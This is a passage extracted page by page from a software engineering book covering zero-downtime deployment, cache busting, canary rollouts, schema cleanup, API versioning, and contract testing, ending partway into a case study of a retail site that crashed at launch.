      "content": "Phases of Deployment • 255\n\nLoad Document\n\nEventReceived\n\nDocumentCurrent?\n\nProcess Event\n\nUpdate Document\n\nSave in New Format\n\nno\n\nyes\n\nSendResponse\n\ngoing against the same document type. That might mean you need to break up some larger design changes into multiple releases.\n\nIt should be evident that “trickle, then batch” isn’t limited to schemaless databases. You can use it for any big migration that would normally take too long to execute during a deployment.\n\nThat takes care of the back-end storage systems. The other issue that com- monly causes us to take downtime is changes in web assets.\n\nWeb Assets\n\nThe database isn’t the only place where versions matter. If your application includes any kind of user interface, then you have other assets to worry about: images, style sheets, and JavaScript files. In today’s applications, front-end asset versions are very tightly coupled to back-end application changes. It’s\n\nreport erratum • discuss",
      "content_length": 955,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 262,
      "content": "Chapter 13. Design for Deployment • 256\n\nvital to ensure that users receive assets that are compatible with the back- end instance they will interact with. We must address three major concerns: cache-busting, versioning, and session affinity.\n\nStatic assets should always have far-future cache expiration headers. Ten years is a reasonable number. This helps the user, by allowing the user’s browser to cache as much as possible. It helps your system, by reducing redundant requests. But when the time comes to deploy an application change, we actually do need the browser to fetch a new version of the script. “Cache busting” refers to any number of techniques to convince the browser—and all the intermediate proxies and cache servers—to fetch the new hotness.\n\nSome cache busting libraries work by adding a query string to the URL, just enough to show a new version. The server-side application emits HTML that updates the URL from this:\n\n<link rel=\"stylesheet\" href=\"/styles/app.css?v=4bc60406\"/>\n\nto this:\n\n<link rel=\"stylesheet\" href=\"/styles/app.css?v=a5019c6f\"/>\n\nI prefer to just use a git commit SHA for a version identifier. We don’t care too much about the specifics of the version. We just need it to match between the HTML and the asset.\n\n<link rel=\"stylesheet\" href=\"/a5019c6f/styles/app.css\"/> <script src=\"/a5019c6f/js/login.js\"></script>\n\nStatic assets are often served differently than application pages. That’s why I like to incorporate the version number into the URL or the filename instead of into a query string. That allows me to have both the old and new versions sitting in different directories. I can also get a quick view into the contents of a single version, since they’re all under the same top-level directory.\n\nA word of caution: You’ll find advice on the Net to only use version numbers for cache busting, then use rewrite rules to strip out the version portion and have an unadorned path to look up for the actual file. This assumes a big bang deployment and an instantaneous switchover. It won’t work in the kind of deployment we want.\n\nWhat if your application and your assets are coming from the same server? Then you might encounter this issue: The browser gets the main page from an updated instance, but gets load-balanced onto an old instance when it asks for a new asset. The old instance hasn’t been updated yet, so it lacks the new assets. In this situation, you have two options that will both work:\n\nreport erratum • discuss",
      "content_length": 2473,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 263,
      "content": "Phases of Deployment • 257\n\n1. Configure session affinity so that all requests from the same user go to the same server. Anyone stuck on an old app keeps using the old assets. Anyone on the new app gets served the new assets.\n\n2. Deploy all the assets to every host before you begin activating the new code. This does mean you’re not using the “immutable” deployment style, because you have to modify instances that are already running. In general, it’s probably easier to just serve your static assets from a different cluster.\n\nThe preparation phase is finally done. It’s time to turn our attention to the actual rollout of new code.\n\nRollout\n\nThe time has come to roll the new code onto the machines. The exact mechanics of this are going to vary wildly depending on your environment and choice of configuration management tool. Let’s start by considering a “convergence” style infrastructure with long-lived machines that get changes applied to them.\n\nRight away, we have to decide how many machines to update at a time. The goal is zero downtime, so enough machines have to be up and accepting requests to handle demand throughout the process. Obviously that means we can’t update all machines simultaneously. On the flip side, if we do one machine at a time, the rollout may take an unacceptably long time.\n\nInstead, we typically look to update machines in batches. You may choose to divide your machines into equal-sized groups. Suppose we have five groups named Alpha, Bravo, Charlie, Delta, and Foxtrot. Rollout would go like this:\n\n1.\n\nInstruct Alpha to stop accepting new requests.\n\n2. Wait for load to drain from Alpha.\n\n3. Run the configuration management tool to update code and config.\n\n4. Wait for green health checks on all machines in Alpha.\n\n5.\n\nInstruct Alpha to start accepting requests.\n\n6. Repeat the process for Bravo, Charlie, Delta, and Foxtrot.\n\nYour first group should be the “canary” group. Pause there to evaluate the build before moving on to the next group. Use traffic shaping at your load balancer to gradually ramp up traffic to the canary group while watching monitoring for anomalies in metrics. Is there a big spike in errors logged?\n\nreport erratum • discuss",
      "content_length": 2197,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 264,
      "content": "Chapter 13. Design for Deployment • 258\n\nWhat about a marked increase in latency? Or RAM utilization? Better shut traffic off to that group and investigate before continuing the rollout.\n\nTo stop traffic from going to a machine, we could simply remove it from the load balancer pool. That’s pretty abrupt, though, and may needlessly disrupt active requests. I prefer to have a robust health check on the machine.\n\nEvery application and service should include an end-to-end “health check” route. The load balancer can check that route to see if the instance is accepting work. It’s also a useful thing for monitoring and debugging. A good health check page reports the application version, the runtime’s version, the host’s IP address, and the status of connection pools, caches, and circuit breakers.\n\nWith this kind of health check, a simple status change in the application can inform the load balancer not to send any new work to the machine. Existing requests will be allowed to complete. We can use the same flag when starting the service after pushing the code. Often considerable time elapses between when the service starts listening on a socket and when it’s really ready to do work. The service should start with the “available” flag set to false so the load balancer doesn’t send requests prematurely.\n\nIn our example, when the Charlie group is being updated, Alpha and Bravo will be done but Delta and Foxtrot will be waiting. This is the time when all our careful preparation pays off. Both the old and new versions are running at the same time.\n\nLet’s now consider an “immutable” infrastruc- ture. To roll code out here, we don’t change the old machines. Instead we spin up new machines on the new version of the code. Our key decision is whether to spin them up in the existing cluster or to start a new cluster and switch over. If we start them up in the existing cluster, then we have the situation illustrated in the figure. As the new machines come up and get healthy, they will start taking load. This means that you need session stickiness, or else a single caller could bounce back and forth from the old version on differ- ent requests.\n\nIP Addr\n\nreport erratum • discuss",
      "content_length": 2194,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 265,
      "content": "Phases of Deployment • 259\n\nStarting a new cluster is more like the next figure. Here the new machines can be checked for health and well-being before switching the IP address over to the new pool. In this case, we’re less worried about session stickiness, but the moment of switching the IP address may be traumatic to unfinished requests.\n\nIP Addr\n\nWith very frequent deployments, you are better off starting new machines in the existing cluster. That avoids interrupting open connections. It’s also the more palatable choice in a virtualized corporate data center, where the network is not as easy to reconfigure as in a cloud environment.\n\nNo matter how you roll the code out, it’s true under all these models that in- memory session data on the machines will be lost. You must make that transparent to users. In-memory session data should only be a local cache of information available elsewhere. Decouple the process lifetime from the session lifetime.\n\nEvery machine should be on the new code now. Wait a bit and keep an eye on your monitoring. Don’t swing into cleanup mode until you’re sure the new changes are good. Once you’re done with that grace period it’s time to undo some of our temporary changes.\n\nCleanup\n\nI always tell my kids that a job isn’t done until the tools are put away. Way back in the preparation phase (probably ten minutes ago in real time, or eighteen hours by the playbook from last chapter), we applied the database expansions and added shims. The time has come to finish that task.\n\nRemoving shims is the easy part. Once every instance is on the new code, those triggers are no longer necessary, so you can just delete them. Do put the deletion into a new migration, though.\n\nreport erratum • discuss",
      "content_length": 1736,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 266,
      "content": "Chapter 13. Design for Deployment • 260\n\nIt’s also time now to apply another round of schema changes. This is “contrac- tion,” or tightening down the schema:\n\nDrop old tables. • Drop old views. • Drop old columns. • Drop aliases and synonyms that are no longer used. • Drop stored procedures that are no longer called. • Apply NOT NULL constraints on the new columns. • Apply foreign key constraints.\n\nMost of those are pretty obvious. The exceptions are the two kinds of con- straint. We can only add constraints after the rollout. That’s because the old application version wouldn’t know how to satisfy them. Instances running on the old version would start throwing errors on actions that had been just fine. This breaks our principle of undetectability.\n\nIt might be easy for you to split up your schema changes this way. If you use any kind of migrations framework, then you’ll have an easier time of it. A migrations framework keeps every individual change around as a version- controlled asset in the codebase. The framework can automatically apply any change sets that are in the codebase but not in the schema. In contrast, the old style of schema change relied on a modeling tool—or sometimes a DBA acting like a modeling tool—to create the whole schema at once. New revisions in the tool would create a single SQL file to apply all the changes at once. In this world, you can still split the changes into phases, but it requires more effort. You must model the expansions explicitly, version the model, then model the contractions and version it again.\n\nWhether you write migrations by hand or generate them from a tool, the time- ordered sequence of all schema changes is helpful to keep around. It provides a common way to test those changes in every environment.\n\nFor schemaless databases, the cleanup phase is another time to run one- shots. As with the contraction phase for relational databases, this is when you delete documents or keys that are no longer used or remove elements of documents that aren’t needed any more.\n\nThis cleanup phase is also a great time to review your feature toggles. Any new feature toggles should have been set to “off” by default. The cleanup phase is a good time to review them to see what you want to enable. Also take a look at the existing settings. Are there any toggles that you no longer need? Schedule them for removal.\n\nreport erratum • discuss",
      "content_length": 2401,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 267,
      "content": "Deploy Like the Pros • 261\n\nDeploy Like the Pros\n\nIn those old days of the late 2000s, deployment was a completely different concern than design. Developers built their software, delivered a binary and a readme file, and then operations went to work. No longer. Deployments are frequent and should be seamless. The boundary between operations and development has become fractal. We must design our software to be deploy- able, just as we design software for production.\n\nBut great news! This isn’t just an added burden on the already-behind- schedule development team. Designing for deployment gives you the ability to make large changes in small steps.\n\nThis all rests on a foundation of automated action and quality checking. Your build pipeline should be able to apply all the accumulated wisdom of your architects, developers, designers, testers, and DBAs. That goes way beyond running tests during the build. For instance, there’s a common omission that causes hours of downtime: forgetting an index on a foreign key constraint. If you’re not in the relational world, that sentence probably didn’t mean much. If you are in the relational world, it probably made you scrunch up your face and go, “Ooh, ouch.” Why would such an omission reach production? One answer leads to the dark side. If you said, “Because the DBA didn’t check the schema changes,” then you’ve taken a step on that gloomy path.\n\nAnother way to answer is to say, “Because SQL is hard to parse, so our build pipeline can’t catch that.” This answer contains the seeds of the solution. If you start from the premise that your build pipeline should be able to catch all mechanical errors like that, then it’s obvious that you should start speci- fying your schema changes in something other than SQL DDL. Whether you use a home-grown DSL or an off-the-shelf migration library doesn’t matter that much. The main thing is to turn the schema changes into data so the build pipeline has X-ray vision into the schema changes. Then it can reject every build that defines foreign key constraints without an index. Have the humans define the rules. Have the machines enforce them. Sure it sounds like a recipe for a dystopian sci-fi film, but it’ll let your team sleep at night instead of praying to the Polycom.\n\nWrapping Up\n\nTo be successful, your software will be deployed early and often. That means the act of deployment is an essential part of the system’s life. Therefore, it’s worth designing the software to be deployed easily. Zero downtime is the objective.\n\nreport erratum • discuss",
      "content_length": 2556,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 268,
      "content": "Chapter 13. Design for Deployment • 262\n\nSmaller, easier deployments mean you can make big changes over a series of small steps. That reduces disruption to your users, whether they are humans or other programs.\n\nSo far, we’ve covered the “interior” view of deployments. This includes struc- turing changes to database schemata and documents, rolling the code to machines, and cleaning up afterward. Now it’s time to look at how your soft- ware fits in with the rest of the ecosystem. Handling protocol versions grace- fully is a key aspect of that, so we’ll tackle it next.\n\nreport erratum • discuss",
      "content_length": 599,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 269,
      "content": "CHAPTER 14\n\nHandling Versions\n\nWe now know how to design applications so that they can be deployed easily and repeatedly. That means we also have the ability to change the way our software talks with the rest of the world easily and repeatedly. However, as we make changes to add features, we need to be careful not to break consum- ing applications. Whenever we do that, we force other teams to do more work in order to get running again. Something is definitely wrong if our team cre- ates work for several other teams! It’s better for everyone if we do some extra work on our end to maintain compatibility rather than pushing migration costs out onto other teams. This chapter looks at how your software can be a good citizen.\n\nHelp Others Handle Your Versions\n\nIt won’t come as a surprise to learn that different consumers of your service have different goals and needs. Each consuming application has its own development team that operates on its own schedule. If you want others to respect your autonomy, then you must respect theirs. That means you can’t force consumers to match your release schedule. They shouldn’t have to make a new release at the same time as yours just so you can change your API. That is trivially true if you provide SaaS services across the Internet, but it also holds within a single organization or across a partner channel. Trying to coordinate consumer and provider deployments doesn’t scale. Follow the ripple effect from your deployment and you might find that the whole company has to upgrade at once. That means most new versions of a service should be compatible.\n\nNonbreaking API Changes\n\nIn the TCP specification, Jon Postel gave us a good principle for building robust systems from disparate providers. Postel’s robustness principle says,\n\nreport erratum • discuss",
      "content_length": 1809,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 270,
      "content": "Chapter 14. Handling Versions • 264\n\n“Be conservative in what you do, be liberal in what you accept from others.”1 It has mostly worked out for the Internet as a whole (subject to a lot of caveats from Chapter 11, Security, on page 215,) so let’s see if we can apply this prin- ciple to protocol versions in our applications.\n\nIn order to make compatible API changes, we need to consider what makes for an incompatible change. What we call an “API” is really a layered stack of agreements between pieces of software. Some of the agreements are so funda- mental now that we barely talk about them. For example, when was the last time you saw a network running NetBIOS instead of TCP/IP? We can assume a certain amount of commonality: IP, TCP, UDP, and DNS. (Multicast may be allowed within some boundaries in your network, but this should only be used within a closed set of hosts. Never expect it to be routed between different net- works.) Above that, we are firmly in “layer 7,” the application layer. The consumer and provider must share a number of additional agreements in order to commu- nicate. We can think of these as agreements in the following situations:\n\nConnection handshaking and duration • Request framing • Content encoding • Message syntax • Message semantics • Authorization and authentication\n\nIf you pick the HTTP family (HTTP, HTTPS, HTTP/2) for connection handshak- ing and duration, then you get some of the other agreements baked in. For example, HTTP’s “Content-Type” and “Content-Length” headers help with request framing. (“Framing” is deciding where, in the incoming stream of bytes, a request begins and ends.) Both parties get to negotiate content encoding in the header of the same name.\n\nIs it enough to specify that your API accepts HTTP? Sadly, no. The HTTP specification is vast. (The HTTP/1.1 specification spans five RFCs: RFC7231 to RFC7235.) How many HTTP client libraries handle a “101 Switching Proto- cols” response? How many distinguish between “Transfer-Encoding” and “Content-Encoding?” When we say our service accepts HTTP or HTTPS, what we usually mean is that it accepts a subset of HTTP, with limitations on the accepted content types and verbs, and responds with a restricted set of status codes and cache control headers. Maybe it allows conditional requests, maybe not. It almost certainly mishandles range requests. In short, the services we build agree to a subset of the standard.\n\n1.\n\nhttps://tools.ietf.org/html/rfc761#section-2.10\n\nreport erratum • discuss",
      "content_length": 2515,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 271,
      "content": "Help Others Handle Your Versions • 265\n\nWith this view of communication as a stack of layered agreements, it’s easy to see what makes a breaking change: any unilateral break from a prior agreement. We should be able to make a list of changes that would break agreements:\n\nRejecting a network protocol that previously worked • Rejecting request framing or content encoding that previously worked • Rejecting request syntax that previously worked • Rejecting request routing (whether URL or queue) that previously worked • Adding required fields to the request • Forbidding optional information in the request that was allowed before • Removing information from the response that was previously guaranteed • Requiring an increased level of authorization\n\nYou might notice that we handle requests and replies differently. Postel’s Robustness Principle creates that asymmetry. You might also think of it in terms of covariant requests and contravariant responses, or the Liskov sub- stitution principle. We can always accept more than we accepted before, but we cannot accept less or require more. We can always return more than we returned before, but we cannot return less.\n\nThe flip side is that changes that don’t do those things must be safe. In other words, it’s okay to require less than before. It’s okay to accept more optional information than before. And it’s okay to return more than before the change. Another way to think of it is in terms of sets of required and optional param- eters. (Thank you to Rich Hickey, inventor of Clojure, for this perspective.) The following changes are always safe:\n\nRequire a subset of the previously required parameters • Accept a superset of the previously accepted parameters • Return a superset of the previously returned values • Enforce a subset of the previously required constraints on the parameters\n\nIf you have machine-readable specifications for your message formats, you should be able to verify these properties by analyzing the new specification relative to the old spec.\n\nA tough problem arises that we need to address when applying the Robustness Principle, though. There may be a gap between what we say our service accepts and what it really accepts. For instance, suppose a service takes JSON pay- loads with a “url” field. You discover that the input is not validated as a URL, but just received as a string and stored in the database as a string. You want to add some validation to check that the value is a legitimate URL, maybe with a regular expression. Bad news: the service now rejects requests that it previously accepted. That is a breaking change.\n\nreport erratum • discuss",
      "content_length": 2645,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 272,
      "content": "Chapter 14. Handling Versions • 266\n\nBut wait a minute! The documentation said to pass in a URL. Anything else is bad input and the behavior is undefined. It could do absolutely anything. The classic definition of “undefined behavior” for a function means it may decide to format your hard drive. It doesn’t matter. As soon as the service went live, its implementation becomes the de facto specification.\n\nIt’s common to find gaps like these between the documented protocol and what the software actually expects. I like to use generative testing techniques to find these gaps before releasing the software. But once the protocol is live, what should you do? Can you tighten up the implementation to match the documentation? No. The Robustness Principle says we have no choice but to keep accepting the input.\n\nA similar situation arises when a caller passes acceptable input but the service does something unexpected with it. Maybe there’s an edge case in your algo- rithm. Maybe someone passed in an empty collection instead of leaving the collection element out of the input. Whatever the cause, some behavior just happens to work. Again, this isn’t part of the specification but an artifact of the implementation. Once again, you aren’t free to change that behavior, even if it was something you never intended to support. Once the service is public, a new version cannot reject requests that would’ve been accepted before. Anything else is a breaking change.\n\nEven with these cautions, you should still publish the message formats via something like Swagger/OpenAPI. That allows other services to consume yours by coding to the specification. It also allows you to apply generated tests that will push the boundaries of the specification. That can help you find those two key classes of gaps: between what your spec says and what you think it says, and between what the spec says and what your implemen- tation does. This is “inbound” testing, as shown in the following figure, where you exercise your API to make sure it does what you think it does.\n\nYourService\n\nTestCases\n\nAPI\n\nThose gaps can be large, even when you think you have a strong specifica- tion. I also recommend running randomized, generative tests against services you consume. Use their specifications but your own tests to see if your\n\nreport erratum • discuss",
      "content_length": 2334,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 273,
      "content": "Help Others Handle Your Versions • 267\n\nunderstanding of the spec is correct. This is “outbound” testing, in which you exercise your dependencies to make them act the way you think they do.\n\nOne project of mine had a shared data format used by two geographically separated teams. We discussed, negotiated, and documented a specification that we could all support. But we went a step further. As the consuming group, my team wrote FIT tests that illustrated every case in the specification.2 We thought of these as contract tests. That suite ran against the staging system from the other team. Just the act of writing the tests uncovered a huge number of edge cases we hadn’t thought about. When almost 100 percent of the tests failed on their first run, that’s when we really got specific in the spec. Once the tests all passed, we had a lot of confidence in the integration. In fact, our production deployment went very smoothly and we had no oper- ational failures in that integration over the first year. I don’t think it would have worked nearly as well if we’d had the implementing team write the tests.\n\nThis style of test is shown in the figure that follows. Some people call these “contract tests” because they exercise those parts of the provider’s contract that the consumer cares about. As the figure illustrates, such tests are owned by the calling service, so they act as an early warning system if the provider changes.\n\nYourService\n\nTestCases\n\nAPI\n\nSupplier\n\nyourteamotherteam\n\n2.\n\nhttp://fit.c2.com/\n\nreport erratum • discuss",
      "content_length": 1541,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 274,
      "content": "Chapter 14. Handling Versions • 268\n\nAfter exhausting all other options, you may still find that a breaking change is required. Next we’ll look at how to help others when you must do something drastic.\n\nBreaking API Changes\n\nNothing else will suffice. A breaking change is on the horizon. There are still things you can do to help consumers of your service.\n\nThe very first prerequisite is to actually put a version number in your request and reply message formats. This is the version number of the format itself, not of your application. Any individual consumer is likely to support only one version at a time, so this is not for the consumer to automatically bridge versions. Instead, this version number helps with debugging when something goes wrong.\n\nUnfortunately, after that easy first step, we step right out into shark-infested waters. We have to do something with the existing API routes and their behavior. Let’s use the following routes from a peer-to-peer lending service (the service that collects a loan application for credit analysis) as a running example. It needs to know some things about the loan and the requester:\n\nRoute\n\nVerb\n\nPurpose\n\n/applications\n\nPOST\n\nCreate a new application\n\n/applications/:id\n\nGET\n\nView the state of a specific application\n\n/applications?q=query- string\n\nGET\n\nSearch for applications that match the query\n\n/borrower\n\nPOST\n\nCreate a new borrower\n\n/borrower/:id\n\nGET\n\nView the state of a borrower\n\n/borrower/:id\n\nPUT\n\nUpdate the state of a borrower\n\nTable 1—Example Routes\n\nThat service is up and running, doing great. It turns out that a successful service needs to be changed more often than a useless one. So, naturally, new requirements come up. For one thing, the representation of the loan request is hopelessly inadequate for more than the original, simple UI. The updated UI needs to display much more information and support multiple languages and currencies. It also turns out that one legal entity can be both a borrower and a lender at different times, but that each one can only operate in certain countries (the ones in which they are incorporated.) So we have breaking changes to deal with in both the data returned with the “/request” routes and a need to replace the “/borrower” routes with something more general.\n\nreport erratum • discuss",
      "content_length": 2305,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 275,
      "content": "Help Others Handle Your Versions • 269\n\nHTTP gives us several options to deal with these changes. None are beautiful.\n\n1. Add a version discriminator to the URL, either as a prefix or a query parameter. This is the most common approach in practice. Advantages: It’s easy to route to the correct behavior. URLs can be shared, stored, and emailed without requiring any special handling. You can also query your logs to see how many consumers are using each version over time. For the consumer, a quick glance will confirm which version they are using. Disadvantage: Different representations of the same entity seem like dif- ferent resources, which is a big no-no in the REST world.\n\n2. Use the “Accept” header on GET requests to indicate the desired version. Use the “Content-Type” header on PUT and POST to indicate the version being sent. For example, we can define a media type “application/vnd.lendzit.loan- request.v1” and a new media type “application/vnd.lendzit.loan-request.v2” for our versions. If a client fails to specify a desired version, it gets the default (the first nondeprecated version.) Advantage: Clients can upgrade without changing routes because any URLs stored in databases will con- tinue to work. Disadvantages: The URL alone is no longer enough. Generic media types like “application/json” and “text/xml” are no help at all. The client has to know that the special media types exist at all, and what the range of allowed media types are. Some frameworks support routing based on media type with varying degrees of difficulty.\n\n3. Use an application-specific custom header to indicate the desired version. We can define a header like “api-version.” Advantages: Complete flexibility, and it’s orthogonal to the media type and URL. Disadvantages: You’ll need to write routing helpers for your specific framework. This header is another piece of secret knowledge that must be shared with your consumers.\n\n4. For PUT and POST only, add a field in the request body to indicate the intended version. Advantages: No routing needed. Easy to implement. Disadvantage: Doesn’t cover all the cases we need. In the end, I usually opt for putting something in the URL. A couple of benefits outweigh the drawbacks for me. First, the URL by itself is enough. A client doesn’t need any knowledge beyond that. Second, intermediaries like caches, proxies, and load balancers don’t need any special (read: error-prone) configu- ration. Matching on URL patterns is easy and well understood by everyone in operations. Specifying custom headers or having the devices parse media types to direct traffic one way or another is much more likely to break. This is partic- ularly important to me when the next API revision also entails a language or\n\nreport erratum • discuss",
      "content_length": 2775,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 276,
      "content": "Chapter 14. Handling Versions • 270\n\nframework change, where I’d really like to have the new version running on a separate cluster.\n\nNo matter which approach you choose, as the provider, you must support both the old and the new versions for some period of time. When you roll out the new version (with a zero-downtime deployment, of course), both versions should operate side by side. This allows consumers to upgrade as they are able. Be sure to run tests that mix calls to the old API version and the new API version on the same entities. You’ll often find that entities created with the new version cause internal server errors when accessed via the old API.\n\nIf you do put a version in the URLs, be sure to bump all the routes at the same time. Even if just one route has changed, don’t force your consumers to keep track of which version numbers go with which parts of your API.\n\nOnce your service receives a request, it has to process it according to either the old or the new API. I’ll assume that you don’t want to just make a complete copy of all the v1 code to handle v2 requests. Internally, we want to reduce code duplication as much as possible, so long as we can still make future changes. My preference is to handle this in the controller. Methods that handle the new API go directly to the most current version of the business logic. Methods that handle the old API get updated so they convert old objects to the current ones on requests and convert new objects to old ones on responses.\n\nNow you know how to make your service behave like a good citizen. Unfortu- nately, not every service is as well behaved as yours. We need to look at how to handle input from others.\n\nHandle Others’ Versions\n\nWhen receiving requests or messages, your application has no control over the format. None, zip, zero, nada, zilch. No matter how well the service’s expectations are defined, some joker out there will pass you a bogus message. You’re lucky if the message is just missing some required fields. Right now, we’re just going to talk about how to design for version changes. (For a more thoroughly chilling discussion about interface definitions, see Integration Points, on page 33.)\n\nThe same goes for calling out to other services. The other endpoint can start rejecting your requests at any time. After all, they may not observe the same safety rules we just described, so a new deployment could change the set of required parameters or apply new constraints. Always be defensive.\n\nreport erratum • discuss",
      "content_length": 2518,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 277,
      "content": "Handle Others’ Versions • 271\n\nLet’s look at the loan application service again. As a reminder, from Table 1, Example Routes, on page 268, we have some routes to collect a loan application and data about the borrower.\n\nNow suppose a consumer sends a POST to the /applications route. The POST body represents the requester and the loan information. The details of what happens next vary depending on your language and framework. If you’re in an object-oriented language, then each of those routes connects to a method on a controller. In a functional language, they route to functions that close over some state. No matter what, the post request eventually gets dispatched to a function with some arguments. Ultimately the arguments are some kind of data objects that represent the incoming request. To what extent can we expect that the data objects have all the right information in the right fields? About all we can expect is that the fields have the right syntactic type (integer, string, date, and so on), and that’s only if we’re using an automatic mapping library. If you have to handle raw JSON, you don’t even have that guarantee. (Make sure to always wash your hands and clean your work surfaces after handling raw JSON!)\n\nImagine that our loan service has gotten really popular and some banks want in on the action. They’re willing to offer a better rate for borrowers with good credit, but only for loans in certain categories. (One bank in particular wants to avoid mobile homes in Tornado Alley.) So you add a couple of fields. The requester data gets a new numeric field for “creditScore.” The loan data gets a new field for “collateralCategory” and a new allowed value for the “riskAd- justments” list. Sounds good.\n\nHere’s the bad news. A caller may send you all, some, or none of these new fields and values. In some rare cases, you might just respond with a “bad request” status and drop it. Most of the time, however, your function must be able to accept any combination of those fields. What should you do if the loan request includes the collateral category—and it says “mobile home”— but the risk adjustments list is missing? You can’t tell the bank if that thing is going to get opened up like a sardine can in the next big blow. Or what if the credit score is missing? Do you still send the application out to your financial partners? Are they going to do a credit score lookup or will they just throw an error at you?\n\nAll these questions need answers. You put some new fields in your request specification, but that doesn’t mean you can assume anyone will obey them.\n\nA parallel problem exists with calls that your service sends out to other ser- vices. Remember that your suppliers can deploy a new version at any time, too. A request that worked just a second ago may fail now.\n\nreport erratum • discuss",
      "content_length": 2832,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 278,
      "content": "Chapter 14. Handling Versions • 272\n\nThese problems are another reason I like the contract testing approach from Help Others Handle Your Versions, on page 263. A common failing in integration tests is the desire to overspecify the call to the provider. As shown in the figure, the test does too much. It sets up a request, issues the request, then makes assertions about the response based on the data in the original request. That verifies how the end-to-end loop works right now, but it doesn’t verify that the caller correctly conforms to the contract, nor that the caller can handle any response the supplier is allowed to send. Consequently, some new release in the provider can change the response in an allowed but unexpected way, and the consumer will break.\n\nTestCase\n\nProductionCode\n\nCall with parameters\n\nSet uprequest\n\nReal or MockService\n\nIssue request\n\nResponse\n\nResponse\n\nValidateResponse\n\nIn this style of testing, it can be hard to provoke the provider into giving back error responses too. We often need to resort to special flags that mean “always throw an exception when I give you this parameter.” You just know that, sooner or later, that test code will reach production.\n\nI prefer a style of testing that has each side check its own conformance to the specification. In the figure on page 273, we can see the usual test being split into two different parts.\n\nThe first part just checks that requests are created according to the provider’s requirements. The second part checks that the caller is prepared to handle responses from the provider. Notice that neither of these parts invokes the external service. They are strictly about testing how well our code adheres to the contract. We exercised the contract test before with explicit contract tests that ensure the provider does what it claims to do. Separating the tests into these parts helps isolate breakdowns in communication. It also makes our\n\nreport erratum • discuss",
      "content_length": 1950,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 279,
      "content": "Wrapping Up • 273\n\nTestCode\n\nTestCode\n\nProductionCode\n\nCall with parameters\n\nSet uprequest\n\nRequest\n\nValidateRequestRequest Side\n\nProcess response\n\nDo Stuﬀand Things\n\nGenerateFakeResponse\n\nValidate ResultsResponse Side\n\nProductionCode\n\ncode more robust because we no longer make unjustified assumptions about how the other party behaves.\n\nAs always, your software should remain cynical. Even if your most trusted service provider claims to do zero-downtime deployments every time, don’t forget to protect your service. Refer to Chapter 5, Stability Patterns, on page 91, for self-defense techniques.\n\nWrapping Up\n\nLike many places where our software intersects with the external environment, versioning is inherently messy. It will always remain a complex topic. I recom- mend a utilitarian philosophy. The net suffering in your organization is min- imized if everyone thinks globally and acts locally. The alternative is an entire organization slowly grinding to a halt as every individual release gets tied down waiting for synchronized upgrades of its clients.\n\nIn this chapter, we’ve seen how to handle our versions to aid others and how to defend ourselves against version changes in our consumers and providers. Next we look at the operations side of the equation—namely, how to build transparency into our systems and how to adapt when transparency reveals a need for change.\n\nreport erratum • discuss",
      "content_length": 1408,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 280,
      "content": "Part IV\n\nSolve Systemic Problems",
      "content_length": 32,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 281,
      "content": "CHAPTER 15\n\nCase Study: Trampled by Your Own Customers\n\nAfter years of work, the day of launch finally arrived. I had joined this huge team (more than three hundred in total) nine months earlier to help build a complete replacement for a retailer’s online store, content management, customer service, and order-processing systems. Destined to be the company’s backbone for the next ten years, it was already more than a year late when I joined the team. For the previous nine months, I had been in crunch mode: taking lunches at my desk and working late into the night. A Minnesota winter will test your soul even under the best of times. Dawn rises late, and dusk falls early. None of us had seen the sun for months. It often felt like an inescapable Orwellian nightmare. We had crunched through spring, the only season worth living here for. One night I went to sleep in winter, and the next time I looked around, I realized summer had arrived.\n\nAfter nine months, I was still one of the new guys. Some of the development teams had crunched for more than a year. They had eaten lunches and dinners brought in by the client every day of the week. Even today, some of them still shiver visibly when remembering turkey tacos.\n\nCountdown and Launch\n\nWe’d had at least six different “official” launch dates. Three months of load testing and emergency code changes. Two whole management teams. Three targets for the required user load level (each revised downward).\n\nToday, however, was the day of triumph. All the toil and frustration, the for- gotten friends, and the divorces were going to fade away after we launched.\n\nreport erratum • discuss",
      "content_length": 1643,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 282,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 278\n\nThe marketing team—many of whom hadn’t been seen since the last of the requirements-gathering meetings two years earlier—gathered in a grand conference room for the launch ceremony, with champagne to follow. The technologists who had turned their vague and ill-specified dreams into reality gathered around a wall full of laptops and monitors that we set up to watch the health of the site.\n\nAt 9 a.m., the program manager hit the big red button. (He actually had a big red button, which was wired to an LED in the next room, where a techie clicked Reload on the browser being projected on the big screen.) The new site appeared like magic on the big screen in the grand conference room. Where we lurked in our lair on the other side of the floor, we heard the marketers give a great cheer. Corks popped. The new site was live and in production.\n\nOf course, the real change had been initiated by the content delivery network (CDN). A scheduled update to their metadata was set to roll out across their network at 9 a.m. central time. The change would propagate across the CDN’s network of servers, taking about eight minutes to be effective worldwide. We expected to see traffic ramping up on the new servers starting at about 9:05 a.m. (The browser in the conference room was configured to bypass the CDN and hit the site directly, going straight to what the CDN called the “origin servers.” Marketing people aren’t the only ones who know how to engage in smoke and mirrors.) In fact, we could immediately see the new traffic coming into the site.\n\nBy 9:05 a.m., we already had 10,000 sessions active on the servers.\n\nAt 9:10 a.m., more than 50,000 sessions were active on the site.\n\nBy 9:30 a.m., 250,000 sessions were active on the site. Then the site crashed.\n\nWe really put the “bang” in “big bang” release.\n\nAiming for Quality Assurance\n\nTo understand why the site crashed so badly, so quickly, we must take a brief look back at the three years leading up to that point.\n\nIt’s rare to see such a greenfield project, for a number of good reasons. For starters, there’s no such 